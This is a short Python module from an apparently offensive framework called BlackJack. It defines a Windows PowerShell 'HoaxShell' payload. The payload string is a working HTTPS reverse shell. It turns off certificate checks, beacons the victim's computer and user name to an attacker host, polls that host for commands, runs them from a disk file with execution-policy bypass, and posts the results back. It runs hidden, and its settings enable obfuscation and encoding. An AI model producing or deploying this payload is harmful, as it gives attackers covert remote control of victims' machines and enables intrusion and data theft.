# This module is part of the BlackJack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell outfile HoaxShell https',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'An Https based beacon-like reverse shell that writes and executes commands from disc',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
    }

    meta = {
        'handler' : 'hoaxshell',
        'type' : 'ps-outfile-cm-ssl',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 0.8,
        'outfile' : "C:\\Users\\$env:USERNAME\\.local\\haxor.ps1"
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : True,
        'encode' : True
    }

    data = '''Start-Process $PSHOME\powershell.exe -ArgumentList {add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$ConfirmPreference='None';$s=\'*LHOST*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*BLACKJACKID*"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*BLACKJACKID*"=$i});if (!(@(\'None\',\'quit\') -contains $c)) {echo "$c" | out-file -filepath *OUTFILE*;$r=powershell -ep bypass *OUTFILE* -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/*POSTRES* -Method POST -Headers @{"*BLACKJACKID*"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} elseif ($c -eq \'quit\') {del *OUTFILE*;Stop-Process $PID} sleep *FREQ*}} -WindowStyle Hidden'''
